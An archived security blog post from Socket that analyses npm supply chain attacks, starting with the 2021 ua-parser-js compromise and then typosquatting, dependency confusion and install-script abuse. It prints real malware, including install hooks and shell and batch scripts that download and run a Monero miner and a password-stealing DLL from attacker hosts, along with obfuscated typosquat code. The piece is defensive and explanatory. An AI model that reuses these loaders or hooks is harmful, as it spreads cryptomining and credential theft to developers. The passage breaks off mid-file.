<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://socket.dev/blog/inside-node-modules">Original</a>
    <h1>What&#39;s Going on Inside Your Node_modules Folder?</h1>
    
    <div id="readability-page-1" class="page"><div dir="ltr"><h2>Let me tell you a story...</h2>
<p>On January 13, 2012, over ten year ago, a developer named Faisal Salman
published a new project to GitHub called <code>ua-parser-js</code> and it parsed user agent
strings. Lots of people found this project useful. Over the next 10 years,
Faisal continued to develop the package along with help from many open source
contributors. It eventually grew to 7 million downloads per week and was used by
nearly 3 million GitHub repositories.</p>
<p><span><span><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271948%27%20height=%27760%27/%3e"/></span><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic"/></span></p>
<h2>Now, let me tell you a different story...</h2>
<p>On October 5th, 2021 on a notorious Russian hacking forum, this post appeared:</p>
<pre><code>I sell a development account on npmjs.com, more than 7 million installations
every week, more than 1000 others are dependent on this.

There is no 2FA on the account. Login and password access. The password is
enough to change your email.

Suitable for distributing installations, miners, creating a botnet

Start $10k
Step $1k
Blitz $20k
</code></pre>
<p>This hacker was offering to sell the password to an npm account that controlled a package with over 7 million weekly downloads. His asking price was $20,000 USD for the password.</p>
<h2>This is where the two stories intersect</h2>
<p>Two weeks later, on Friday, October 22, 2021 at 12:15pm GMT, <code>ua-parser-js</code> was compromised. Three malicious versions were published – <code>0.7.29</code>, <code>0.8.0</code>, and <code>1.0.0</code> – which contained malware. The malware was particularly nasty and it caught everyone by surprise.</p>
<h2>Anatomy of a supply chain attack</h2>
<p>Let&#39;s take a look at what that malware does. This is the <code>package.json</code> file for one of the
compromised versions:</p>
<h3><code>package.json</code></h3>
<pre><code>{
  <span>&#34;title&#34;</span>: <span>&#34;UAParser.js&#34;</span>,
  <span>&#34;name&#34;</span>: <span>&#34;ua-parser-js&#34;</span>,
  <span>&#34;version&#34;</span>: <span>&#34;0.7.29&#34;</span>,
  <span>&#34;author&#34;</span>: <span>&#34;Faisal Salman &lt;<a href="https://socket.dev/cdn-cgi/l/email-protection" data-cfemail="17715771767e64767b7a76793974787a">[email protected]</a>&gt; (http://faisalman.com)&#34;</span>,
  <span>&#34;description&#34;</span>: <span>&#34;Lightweight JavaScript-based user-agent string parser&#34;</span>,
  <span>&#34;main&#34;</span>: <span>&#34;src/ua-parser.js&#34;</span>,
  <span>&#34;scripts&#34;</span>: {
    <span>&#34;preinstall&#34;</span>: <span>&#34;start /B node preinstall.js &amp; node preinstall.js&#34;</span>,
    <span>&#34;build&#34;</span>: <span>&#34;uglifyjs src/ua-parser.js ...&#34;</span>,
    <span>&#34;test&#34;</span>: <span>&#34;jshint src/ua-parser.js &amp;&amp; mocha -R nyan test/test.js&#34;</span>,
    <span>&#34;test-ci&#34;</span>: <span>&#34;jshint src/ua-parser.js &amp;&amp; mocha -R spec test/test.js&#34;</span>
  }
}
</code></pre>
<p>You&#39;ll see that it uses a pre-install script, so this means that the command <code>start /B node preinstall.js &amp; node preinstall.js</code> will run automatically anytime this package is installed.</p>
<p>Let&#39;s take a look at the <code>preinstall.js</code> script:</p>
<h3><code>preinstall.js</code></h3>
<pre><code><span>const</span> { exec } = <span>require</span>(<span>&#39;child_process&#39;</span>)

<span><span>function</span> <span>terminalLinux</span>(<span></span>) </span>{
  exec(<span>&#39;/bin/bash preinstall.sh&#39;</span>, <span>(<span>error, stdout, stderr</span>) =&gt;</span> {
    <span>if</span> (error) {
      <span>console</span>.log(<span>`error: <span>${error.message}</span>`</span>)
      <span>return</span>
    }
    <span>if</span> (stderr) {
      <span>console</span>.log(<span>`stderr: <span>${stderr}</span>`</span>)
      <span>return</span>
    }
    <span>console</span>.log(<span>`stdout: <span>${stdout}</span>`</span>)
  })
}

<span>var</span> opsys = process.platform
<span>if</span> (opsys == <span>&#39;darwin&#39;</span>) {
  opsys = <span>&#39;MacOS&#39;</span>
} <span>else</span> <span>if</span> (opsys == <span>&#39;win32&#39;</span> || opsys == <span>&#39;win64&#39;</span>) {
  opsys = <span>&#39;Windows&#39;</span>
  <span>const</span> { spawn } = <span>require</span>(<span>&#39;child_process&#39;</span>)
  <span>const</span> bat = spawn(<span>&#39;cmd.exe&#39;</span>, [<span>&#39;/c&#39;</span>, <span>&#39;preinstall.bat&#39;</span>])
} <span>else</span> <span>if</span> (opsys == <span>&#39;linux&#39;</span>) {
  opsys = <span>&#39;Linux&#39;</span>
  terminalLinux()
}
</code></pre>
<p>The first thing you&#39;ll see is that it runs a different payload depending on the victim&#39;s operating system. On Linux, the malware executes <code>preinstall.sh</code>, while on Windoews it executes <code>preinstall.bat</code>. Mac users got lucky – there was no Mac payload. Perhaps the attacker ran out of time to finish the Mac version, or didn&#39;t have a Mac to test on?</p>
<p>Now let&#39;s take a look at what <code>preinstall.sh</code> does:</p>
<h3><code>preinstall.sh</code></h3>
<pre><code>IP=$(curl -k https://freegeoip.app/xml/ | grep <span>&#39;RU\|UA\|BY\|KZ&#39;</span>)
<span>if</span> [ -z <span>&#34;<span>$IP</span>&#34;</span> ]
    <span>then</span>
	var=$(pgrep jsextension)
	<span>if</span> [ -z <span>&#34;<span>$var</span>&#34;</span> ]
		<span>then</span>
		curl http://159.148.186.228/download/jsextension -o jsextension
		<span>if</span> [ ! -f jsextension ]
			<span>then</span>
			wget http://159.148.186.228/download/jsextension -O jsextension
		<span>fi</span>
		chmod +x jsextension
		./jsextension -k --tls --rig-id q -o pool.minexmr.com:443 -u &lt;redacted&gt; \
            --cpu-max-threads-hint=50 --donate-level=1 --background &amp;&gt;/dev/null &amp;
	<span>fi</span>
<span>fi</span>
</code></pre>
<p>The very first line fetches the victim&#39;s country code using their IP address. If the victim is from Russia, Ukraine, Belarus, or Kazakhstan, then the malware exits early. Presumably the attacker comes from one of these countries and doesn&#39;t want to antagonize their local law enforcement. This is a common technique in malware.</p>
<p>Next, there&#39;s a check using <code>pgrep</code> to see if the malware – a process named <code>jsextension</code> – is already running. If so, then the malware exits early.</p>
<p>Otherwise, the script proceeds to download a file from an IP address, mark that file as executable, and then run it. Based on these command line flags, the program appears to be a Monero miner. This program will mine the Monero cryptocurrency for the attacker, wasting the victim&#39;s CPU cycles and potentially driving up their electricity or cloud hosting bill.</p>
<p>The payload for Windows users is quite similar, with one extra twist:</p>
<h3><code>preinstall.bat</code></h3>
<pre><code>@<span>echo</span> off
curl http://<span>159</span>.<span>148</span>.<span>186</span>.<span>228</span>/download/jsextension.exe -o jsextension.exe
<span>if</span> <span>not</span> <span>exist</span> jsextension.exe (
	wget http://<span>159</span>.<span>148</span>.<span>186</span>.<span>228</span>/download/jsextension.exe -O jsextension.exe
)
<span>if</span> <span>not</span> <span>exist</span> jsextension.exe (
	certutil.exe -urlcache -f http://<span>159</span>.<span>148</span>.<span>186</span>.<span>228</span>/download/jsextension.exe jsextension.exe
)
curl https://citationsherbe.<span>at</span>/sdd.dll -o create.dll
<span>if</span> <span>not</span> <span>exist</span> create.dll (
	wget https://citationsherbe.<span>at</span>/sdd.dll -O create.dll
)
<span>if</span> <span>not</span> <span>exist</span> create.dll (
	certutil.exe -urlcache -f https://citationsherbe.<span>at</span>/sdd.dll create.dll
)
<span>set</span> exe_1=jsextension.exe
<span>set</span> &#34;count_1=<span>0</span>&#34;
&gt;tasklist.temp (
tasklist /NH /FI &#34;IMAGENAME eq <span>%exe_1%</span>&#34;
)
<span>for</span> /f <span>%%x</span> <span>in</span> (tasklist.temp) <span>do</span> (
<span>if</span> &#34;<span>%%x</span>&#34; <span>EQU</span> &#34;<span>%exe_1%</span>&#34; <span>set</span> /a count_1+=<span>1</span>
)
<span>if</span> <span>%count_1%</span> <span>EQU</span> <span>0</span> (<span>start</span> /B .\jsextension.exe -k --tls --rig-id q -o pool.minexmr.com:<span>443</span> -u &lt;redacted&gt; \
   --cpu-max-threads-hint=<span>50</span> --donate-level=<span>1</span> --background &amp; regsvr32.exe -s create.dll)
<span>del</span> tasklist.temp
</code></pre>
<p>On Windows, the malware not only downloads a Monero miner (<code>jsextension.exe</code>), but it downloads a .DLL file as well.</p>
<p>After starting the Monero miner, the malware registers the .DLL file by running <code>regsvr32.exe -s create.dll</code>. This .DLL file steals passwords from over 100 different programs on the Windows machine as well as all the passwords in the Windows credential manager.</p>
<p>Yikes!</p>

<p>This is a really nasty piece of malware. Anyone unlucky enough to run this lost all their passwords and had to do a complete reset of their online accounts – not a fun time!</p>
<h2>Aftermath</h2>
<p>The malicious package was available for about four hours. The open source
community, as well as the maintainer, did quite well at finding and reporting
the problem to npm who were able to remove it. Despite things going quite well
by historical standards – 4 hours is a very quick turnaround time – tens of
thousands of malicious downloads still took place. Even a few minutes is a lot a
package gets 7 million weekly downloads!</p>
<p>Anyone who ran <code>npm install ua-parser-js</code> was compromised. Anyone who installed
a package that depended on <code>ua-parser-js</code> was also compromised, including
important packages such as <code>react-native</code>. Anyone running <code>npm install</code> without
a <code>package-lock.json</code> file was compromised. Anyone unlucky enough to update to a
new version of <code>ua-parser-js</code>, whether manually with <code>npm update</code> or through an
automated pull request such as from Dependabot, was compromised.</p>
<h2>Just the tip of the iceberg</h2>
<p>This is really just the tip of the iceberg. At <a href="https://socket.dev/">Socket</a>, we&#39;ve been tracking packages that are <a href="https://socket.dev/npm/category/removed">removed from npm for security reasons</a>. We&#39;ve seen over 700 packages removed for security reasons in the last 30 days, and this trend is accelerating.</p>
<p>Attackers are taking advantage of the open ecosystem and the implicit trust that maintainers have for each other through the liberal contribution policies that have become common in the modern open source era.</p>
<p>We predict that 2022 will be the &#34;year of software supply chain security&#34; as the
awareness of this issue has exploded due to several massive software supply
chain attacks such as SolarWinds as well as near weekly npm attacks in the news.
It feels like we&#39;ve reached a breaking point and developers, companies, and
governments finally seem ready to take action to protect the open source
ecosystem.</p>
<p>One question you might ask, though, is...</p>
<h2>Why is this happening now?</h2>
<p>I want to start by just pointing out that what we&#39;re trying to do here is kind of crazy. We want to:</p>
<ul>
<li>Download <strong>code</strong></li>
<li>from the <strong>internet</strong></li>
<li>written by <strong>unknown individuals</strong></li>
<li>that we <strong>haven&#39;t read</strong></li>
<li>that we <strong>execute</strong></li>
<li>with <strong>full permissions</strong></li>
<li>on our <strong>laptops and servers</strong></li>
<li>where we keep our <strong>most important data</strong></li>
</ul>
<p>This is what we&#39;re doing every day when we use <code>npm install</code>. It&#39;s a <em>miracle</em> that this system works – and that it&#39;s continued to <em>mostly</em> work for this long!</p>
<p>It&#39;s a testament to the fact that most people are good. But, unfortunately, not
everyone is is good. And even more unfortunately, even just a small handful of bad actors in the ecosystem can cause massive supply chain attacks that shake our trust in open source code.</p>
<p>Now let&#39;s let&#39;s dive into why this is happening now.</p>
<h2>1. 90% of the lines of code in your app comes from open source</h2>
<p>We&#39;re standing on the shoulders of giants. Open source is the reason we can get
an app off the ground in hours and days instead of weeks or months. It&#39;s the
reason that we don&#39;t need to be an expert in cryptography or timezones or
network protocols to build a powerful, modern software application.</p>
<p>It&#39;s also the reason why your <code>node_modules</code> folder is one of the heaviest
objects in the universe.</p>
<p><span><span><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271000%27%20height=%27420%27/%3e"/></span><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic"/></span></p>
<h2>2. Lots of transitive dependencies</h2>
<p>Another reason is that we have lots and lots of transitive dependencies. The way
that we write software has changed. We use dependencies a lot more liberally.
Installing even a single dependency often leads to many dozens or hundreds of
transitive dependencies coming in as well.</p>
<p>A 2019 paper at USENIX, found that installing an average npm package introduces an implicit trust on 79 third-party packages and 39 maintainers.</p>
<div><div><div><p>– </p><!-- --><p>Markus Zimmermann, Cristian-Alexandru Staicu, Cam Tenny, Michael Pradel (&#34;Small World with High Risks: A Study of Security Threats in the npm Ecosystem&#34;)</p></div></div></div>
<p>Here&#39;s another way to look at. We created a visualization to show you what the dependency tree of a typical package looks like. Let&#39;s look at <code>webpack</code>, which is a dependency present in many JavaScript projects.</p>
<p>Each gray box represents a package and each purple box represents a file inside a package:</p>
<h3>Webpack, unpacked</h3>

<p><em>The visualization above is interactive. Drag to rotate. Click to navigate to a package or file.</em></p>
<p>As you take away each layer of the dependency tree you&#39;ll see that you just keep finding more packages nested inside the top-level package, until you eventually get down to the bottom of the tree.</p>
<p>There are an insane number of files and a lot of packages flying around here.</p>
<h2>3. No one reads the code</h2>
<p>Another reason is that no one really reads the code. Of course, there are some people who do, but by-and-large, people don&#39;t look at the code that they&#39;re executing on their machines.</p>
<p>One big reason for this is that npm really doesn&#39;t make this very easy. If you go to the package page for <code>ua-parser-js</code> and you click on the &#34;Explore&#34; tab, you&#39;ll see that you can&#39;t even see the files of the package:</p>
<p><span><span><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%272638%27%20height=%271454%27/%3e"/></span><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic"/></span></p>
<p>So, people have to resort to clicking the GitHub link in the sidebar and going to GitHub and <strong><em>hoping</em></strong> that the code on GitHub matches the code that&#39;s on npm, which is not necessarily true. In fact, many of the biggest npm supply chain attacks have taken advantage of this fact.</p>
<p>The lack of people looking at the code inside of npm packages is also a big reason why, on average, npm malware lingers on the registry for 209 days before it&#39;s finally reported and removed.</p>
<div><div><div><p>– </p><!-- --><p>Marc Ohm, Henrik Plate, Arnold Sykosch, Michael Meier (&#34;Backstabber&#39;s Knife Collection: A Review of Open Source Software Supply Chain Attacks&#34;)</p></div></div></div>
<p>When I first read this statistic, I found it hard to believe, but it&#39;s been confirmed by further research.</p>
<p>A 2021 paper at NDSS, a prestigious security conference, also found similar results. Even worse, they found that 20% of malware persist in package managers for over 400 days and have more than 1,000 downloads.</p>
<div><div><div><p>– </p><!-- --><p>Ruian Duan, Omar Alrawi, Ranjita Pai Kasturi, Ryan Elder, Brendan Saltaformaggio, Wenke Lee</p></div></div></div>
<p>It&#39;s disturbing to realize that npm is filled with landmines that can be set off inadvertently if we make a small typo in one of the many <code>npm install</code> commands we run on a daily basis.</p>
<h2>4. Popular tools give a false sense of security</h2>
<p>And the fourth reason is that popular tools give a false sense of security. A
lot of popular tools – such as Dependabot and Snyk – scan your dependencies for
known vulnerabilities (CVEs). In 2022, this is no longer sufficient. We can&#39;t
just scan for known vulnerabilities and stop there. And yet that&#39;s what the most
popular supply chain security products do, leaving you vulnerable.</p>
<p>It can take weeks or months for a vulnerability to be discovered, reported, and detected by tools. That&#39;s just not fast enough to stop supply chain attacks.</p>
<h3>Known vulnerabilities vs. Malware</h3>
<p>Let&#39;s take a second to quickly distinguish between <strong>known vulnerabilities</strong> and
<strong>malware</strong>, because they&#39;re very different.</p>
<p><strong>Vulnerabilities</strong> are accidentally introduced by maintainers – the good guys. They
have varying levels of risk and sometimes it&#39;s okay to intentionally ship a
known vulnerability to production if it&#39;s low impact. Even if you have
vulnerabilities in production they may not be discovered or exploited before you
update to a fixed version. You usually have a bit of time to address these kinds
of issues.</p>
<p><strong>Malware</strong>, on the other hand, is quite different. Malware is intentionally
introduced into a package by an attacker – almost never the maintainer – and it
will always end badly if you ship malware to production. You don&#39;t have a few
days or weeks to mitigate the issue. You need to really catch it before you
install it on your laptop or a production server.</p>
<p>But in today&#39;s culture of fast development, a malicious dependency can be
updated and merged in a very short amount of time, which leads to an increased risk of supply chain
attacks because the quicker you update your dependencies the fewer eyeballs that
have had a chance to look at the code.</p>
<p>Developers need a new approach to detect and to block malicious dependencies.
But before we get into that, let&#39;s look a little deeper into how a supply chain
attack actually works.</p>
<h2>How does a supply chain attack actually work?</h2>
<p>To answer this question, we downloaded every package on npm – 100 GB of metadata and 15 TB of package tarballs. We noticed a few trends in the types of attacks on npm.</p>
<p>Let&#39;s go over the top 6 attack vectors (how the attack gets you to run their code) and attack techniques (what the attack code actually does).</p>
<h2>1. Typosquatting</h2>
<p>The most common attack vector is typosquatting.</p>
<p>Typosquatting is when an attacker publishes a package which has a very similar name to a legitimate and popular package.</p>
<p>Take these two packages with very similar names, for instance:</p>
<pre><code>npm install noblox.js-proxied
npm install noblox.js-proxy
</code></pre>
<p>One of these is legitimate and one of these is malware. But which is which? And what if you can&#39;t remember and so you just take a guess?</p>
<p>Hopefully you guessed right:</p>
<pre><code>npm install noblox.js-proxied (REAL)
npm install noblox.js-proxy (EVIL)
</code></pre>
<p>Let&#39;s crack open the malware package <code>noblox.js-proxy</code> and take a look at it&#39;s <code>package.json</code>:</p>
<h3><code>package.json</code></h3>
<pre><code>{
  <span>&#34;name&#34;</span>: <span>&#34;noblox.js-proxy&#34;</span>,
  <span>&#34;version&#34;</span>: <span>&#34;1.0.5&#34;</span>,
  <span>&#34;description&#34;</span>: <span>&#34;A Node.js wrapper for Roblox. (original from sentanos) (proxy edition by DarkDev)&#34;</span>,
  <span>&#34;main&#34;</span>: <span>&#34;lib/index.js&#34;</span>,
  <span>&#34;types&#34;</span>: <span>&#34;typings/index.d.ts&#34;</span>,
  <span>&#34;scripts&#34;</span>: {
    <span>&#34;docs&#34;</span>: <span>&#34;jsdoc -c jsDocsConfig.json -r -t ./node_modules/better-docs&#34;</span>,
    <span>&#34;lint&#34;</span>: <span>&#34;eslint lib/&#34;</span>,
    <span>&#34;test&#34;</span>: <span>&#34;jest&#34;</span>,
    <span>&#34;postinstall&#34;</span>: <span>&#34;node postinstall.js&#34;</span>
  },
  <span>&#34;repository&#34;</span>: {
    <span>&#34;type&#34;</span>: <span>&#34;git&#34;</span>,
    <span>&#34;url&#34;</span>: <span>&#34;https://github.com/JxySerr1/noblox.js-proxy.git&#34;</span>
  }
}
</code></pre>
<p>Again, you&#39;ll notice that it&#39;s using an install script – a very common technique that malware uses. If you open up this install script to look at the code, you&#39;ll find that the file is heavily
obfuscated:</p>
<pre><code>(<span><span>function</span>(<span>_0x249d1f,_0x2b8f5b</span>)</span>{<span><span>function</span> <span>_0x4c7bcc</span>(<span>_0xab39a4,_0x4f1570,_0x2f32bf,
_0x4d98f7,_0x52a9ec</span>)</span>{<span>return</span> _0x1efa(_0x52a9ec-<span>0x379</span>,_0x4d98f7);}<span><span>function</span> <span>_0xfe08c3</span>
(<span>_0x3d9d3c,_0x4ae939,_0x217de2,_0x4278ef,_0x1a1bd1</span>)</span>{<span>return</span> _0x1efa(_0x3d9d3c- -<span>0x30</span>,
_0x217de2);}<span><span>function</span> <span>_0x5dee13</span>(<span>_0x3bf95a,_0x410ef5,_0x6d0f61,_0x402705,_0x3daba2</span>)
</span>{<span>return</span> _0x1efa(_0x410ef5- -<span>0x6c</span>,_0x3daba2);}<span>const</span> _0x40a390=_0x249d1f();
<span><span>function</span> <span>_0x4ebfb2</span>(<span>_0x39433b,_0x180281,_0x29e008,_0x55bd13,_0x265536</span>)
</span>{<span>return</span> _0x1efa(_0x180281-<span>0x29c</span>,_0x29e008);}<span><span>function</span> <span>_0x1d9570</span>(<span>_0xcf31ba,_0x24a2a8,
_0x1361be,_0x2b2b01,_0x2b71bd</span>)
</span>{<span>return</span> _0x1efa(_0xcf31ba-<span>0x357</span>,_0x24a2a8);}<span>while</span>(!![]){<span>try</span>{<span>const</span> _0xe15807=
-<span>parseInt</span>(_0x4ebfb2(<span>0x718</span>,<span>0x638</span>,<span>&#39;12Eh&#39;</span>,<span>0x6f0</span>,<span>0x6f6</span>))/(<span>0x1e27</span>+-<span>0x2ac</span>+-<span>0x1b7a</span>)
+<span>parseInt</span>(_0x4c7bcc(<span>0x6d5</span>,<span>0x713</span>,<span>0x72c</span>,<span>&#39;JXxJ&#39;</span>,<span>0x644</span>))/(<span>0x15</span>*-<span>0x16e</span>+-<span>0x19c4</span>+<span>0x37cc</span>)
+-<span>parseInt</span>(_0x4c7bcc(<span>0x68d</span>,<span>0x788</span>,<span>0x86c</span>,<span>&#39;JJ[O&#39;</span>,<span>0x754</span>))/(-<span>0x89e</span>+<span>0x2</span>*-<span>0x928</span>+-<span>0xb</span>*-<span>0x273</span>)
*(-<span>parseInt</span>(_0x4ebfb2(<span>0x64f</span>,<span>0x62a</span>,<span>&#39;$53b&#39;</span>,<span>0x530</span>,<span>0x55f</span>))/(-<span>0x2525</span>+<span>0x7c0</span>+-<span>0x1</span>*-<span>0x1d69</span>))
+-<span>parseInt</span>(_0x4c7bcc(<span>0x7d6</span>,<span>0x65e</span>,<span>0x7e5</span>,<span>&#39;tOk*&#39;</span>,<span>0x729</span>))/(<span>0xc7d</span>+<span>0x7cc</span>*-<span>0x1</span>+<span>0x1</span>*-<span>0x4ac</span>)
+-<span>parseInt</span>(_0x4ebfb2(<span>0x544</span>,<span>0x602</span>,<span>&#39;!qJ9&#39;</span>,<span>0x565</span>,<span>0x6c2</span>))/(-<span>0x120e</span>+<span>0x1b1</span>*-<span>0x17</span>+<span>0x1f7</span>*<span>0x1d</span>)
+<span>parseInt</span>(_0xfe08c3(<span>0x359</span>,<span>0x28a</span>,<span>&#39;igej&#39;</span>,<span>0x404</span>,<span>0x3e9</span>))/(<span>0x163</span>*-<span>0x8</span>+<span>0x345</span>+<span>0x192</span>*<span>0x5</span>)
+-<span>parseInt</span>(_0x4ebfb2(<span>0x40f</span>,<span>0x519</span>,<span>&#39;<a href="https://socket.dev/cdn-cgi/l/email-protection" data-cfemail="bf9eff888f">[email protected]</a>&#39;</span>,<span>0x4f5</span>,<span>0x5a2</span>))/(<span>0x1</span>*-<span>0x977</span>+-<span>0x15a</span>+<span>0xad9</span>);
<span>if</span>(_0xe15807===_0x2b8f5b)<span>break</span>;<span>else</span> _0x40a390[<span>&#39;push&#39;</span>](_0x40a390[<span>&#39;shift&#39;</span>]());}
<span>catch</span>(_0xdc6a7c){_0x40a390[<span>&#39;push&#39;</span>](_0x40a390[<span>&#39;shift&#39;</span>]());}}}(_0x6450,-<span>0x4f0c0</span>+
<span>0x260b</span>+<span>0x29</span>*<span>0x4445</span>));<span>const</span> _0x206d7b=(<span><span>function</span>(<span></span>)</span>{<span><span>function</span> <span>_0x2debc5</span>(<span>_0x482afc,
_0x3fd1d9,_0x38f5d5,_0x18ac59,_0x17d73a</span>)</span>{<span>return</span> _0x1efa(_0x18ac59- -<span>0x3d1</span>,_0x17d73a);}
...
</code></pre>
<p>I can tell you that even without knowing exactly what this code is
doing, you can bet this is not something that you want to run on your machine.</p>
<h2>2. Dependency confusion</h2>
<p>This attack vector is pretty closely related to typosquatting. Dependency
confusion happens when a company publishes packages to an internal npm registry
and uses a name that hasn&#39;t yet been registered on the public npm registry.
Later, an attacker can come along and register the available package. Now
there&#39;s a private legitimate package and a public malware package, both with the
same name.</p>
<p>Many internal tools are poorly-written and they may prefer to install the public version
of the package instead of the private one, which means that the attacker&#39;s code will be installed.</p>
<p>Looking through the <a href="https://socket.dev/npm/category/removed">recently removed npm packages</a>, we were able to find dozens of likely dependency confusion attacks, where package names appear to conflict with internal company package names. Major corporations, US federal agencies, and US government contractors were all affected.</p>
<ul>
<li>Yahoo<!-- -->
<ul>
<li><a href="https://socket.dev/npm/package/yahoo-react-input/files/9533.9534.3/pre.js"><code>yahoo-react-input</code></a></li>
<li><a href="https://socket.dev/npm/package/yahoo-react-formsy-input/files/9595.9565.4/index.js"><code>yahoo-react-formsy-input</code></a></li>
</ul>
</li>
<li>EURid (registry manager for EU)<!-- -->
<ul>
<li><a href="https://socket.dev/npm/package/eurid_cloudflare/files/999.999.999/index.js"><code>eurid_cloudflare</code></a></li>
</ul>
</li>
<li>18F (US Federal agency)<!-- -->
<ul>
<li><a href="https://socket.dev/npm/package/18f-dashboard/files/999.999.999/build.js"><code>18f-dashboard</code></a></li>
</ul>
</li>
<li>Unity (game engine)<!-- -->
<ul>
<li><a href="https://socket.dev/npm/package/com.unity.ide.vscode/files/5.0.5/index.js"><code>com.unity.ide.vscode</code></a></li>
<li><a href="https://socket.dev/npm/package/com.unity.package-manager-ui/files/5.0.4/index.js"><code>com.unity.package-manager-ui</code></a></li>
<li><a href="https://socket.dev/npm/package/com.unity.modules.ai/files/5.0.2/index.js"><code>com.unity.modules.ai</code></a></li>
<li><a href="https://socket.dev/npm/package/com.unity.modules.androidjni/files/5.0.1/index.js"><code>com.unity.modules.androidjni</code></a></li>
</ul>
</li>
<li>Palantir (government contractor)<!-- -->
<ul>
<li><a href="https://socket.dev/npm/package/eslint-config-dev-palantir/files/1.0.1/pre.sh"><code>eslint-config-dev-palantir</code></a></li>
</ul>
</li>
<li>DuckDuckGo (search engine)<!-- -->
<ul>
<li><a href="https://socket.dev/npm/package/duckduckgo-styles/files/2.0.10/pre.sh"><code>duckduckgo-styles</code></a></li>
</ul>
</li>
<li>Shippo (shipping company)<!-- -->
<ul>
<li><a href="https://socket.dev/npm/package/shippo-frontend/files/4.0.1/pre.sh"><code>shippo-frontend</code></a></li>
</ul>
</li>
<li>GrubHub (food delivery company)<!-- -->
<ul>
<li><a href="https://socket.dev/npm/package/@grubhubprod/umami-library/files/9998.9998.9/index.js"><code>@grubhubprod/umami-library</code></a></li>
<li><a href="https://socket.dev/npm/package/@grubhubprod/order-taking-client-sdk/files/9988.9996.3/index.js"><code>@grubhubprod/order-taking-client-sdk</code></a></li>
<li><a href="https://socket.dev/npm/package/@grubhubprod/mochi/files/9878.9997.3/index.js"><code>@grubhubprod/mochi</code></a></li>
<li><a href="https://socket.dev/npm/package/@grubhubprod/chiri/files/9997.9998.2/index.js"><code>@grubhubprod/chiri</code></a></li>
</ul>
</li>
<li>Wix (website builder)<!-- -->
<ul>
<li><a href="https://socket.dev/npm/package/wix-media-manager-backend/files/9.999.999/index.js"><code>wix-media-manager-backend</code></a></li>
<li><a href="https://socket.dev/npm/package/wix-marketing-backend/files/1.5677.9/index.js"><code>wix-marketing-backend</code></a></li>
<li><a href="https://socket.dev/npm/package/wix-events-backend/files/2.87.9/index.js"><code>wix-events-backend</code></a></li>
<li><a href="https://socket.dev/npm/package/wix-chat-backend/files/9.999.999/index.js"><code>wix-chat-backend</code></a></li>
</ul>
</li>
</ul>
<p>How were attackers able to figure out these private package names? There are many possible ways, but it&#39;s worth noting that npm itself was <a target="_blank" rel="noopener noreferrer" href="https://www.bleepingcomputer.com/news/security/npm-fixes-private-package-names-leak-serious-authorization-bug/">leaking a subset of private package names<svg viewBox="0 0 24 24" focusable="false"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><path d="M15 3h6v6"></path><path d="M10 14L21 3"></path></g></svg></a> for several weeks which didn&#39;t help the problem.</p>
<h2>3. Hijacked packages</h2>
<p>The third vector that we see a lot is hijacked packages. These are the ones that
you&#39;ve probably seen in the news every few weeks.</p>
<p>Criminals and miscreants find ways to infiltrate our communities and and infect
popular packages. Once they get control of a package and they can publish to it,
they&#39;ll steal credentials or install backdoors or abuse compute resources for
cryptocurrency mining.</p>
<p>This type of attack happens for various reasons:</p>
<ul>
<li>Maintainers choose weak passwords</li>
<li>Maintainers reuse passwords</li>
<li>Maintainers get malware on their laptops</li>
<li>npm doesn&#39;t enforce 2FA for all accounts (though they&#39;ve started to enforce this for top accounts)</li>
<li>Maintainers give access to malicious actors</li>
</ul>
<p>Overworked maintainers are particularly susceptible to this type of attack. When
someone offers a helping hand to a burned out maintainer, it&#39;s sometimes hard
for them to say no.</p>
<h2>4. Install scripts</h2>
<p>As we mentioned before, install scripts are a huge vector. An install script
allows a package to automatically run code upon package installation.</p>
<p>Most npm malware uses install scripts. In fact, 56% of malicious packages start their routines on installation.</p>
<div><div><div><p>– </p><!-- --><p>Marc Ohm, Henrik Plate, Arnold Sykosch, Michael Meier (&#34;Backstabber&#39;s Knife Collection: A Review of Open Source Software Supply Chain Attacks&#34;)</p></div></div></div>
<p>npm allows packages to run code during the installation process. Unfortunately, install scripts do have some legitimate uses, so we can&#39;t just remove this feature from npm without breaking the ecosystem. It&#39;s not an easy problem to solve.</p>
<h2>5. Permission creep (shell, network, filesystem, environment vars)</h2>
<p>Permission creep happens when a package which previously didn&#39;t use privileged APIs, such as the shell, network, filesystem, or environment variables, but then suddenly starts to use these powerful APIs.</p>
<p>Privileged APIs are used in most malware because attackers usually want to steal some secrets, download an executable payload, or run some shell scripts.</p>
<p>Though legitimate packages do sometimes introduce privileged APIs in later package versions, this signal is often a telltale sign of malware, especially when these APIs are introduced in a patch version. Attackers like to publish their malware in a patch version to maximize the number of potential victims who will install it through loose semver ranges.</p>
<p>Let&#39;s look at an example of a malicious package that uses privileged APIs:</p>
<h3><code>package.json</code></h3>
<pre><code>{
  <span>&#34;name&#34;</span>: <span>&#34;&lt;redacted&gt;&#34;</span>,
  <span>&#34;version&#34;</span>: <span>&#34;9998.9999.2&#34;</span>,
  <span>&#34;description&#34;</span>: <span>&#34;...&#34;</span>,
  <span>&#34;main&#34;</span>: <span>&#34;index.js&#34;</span>,
  <span>&#34;scripts&#34;</span>: {
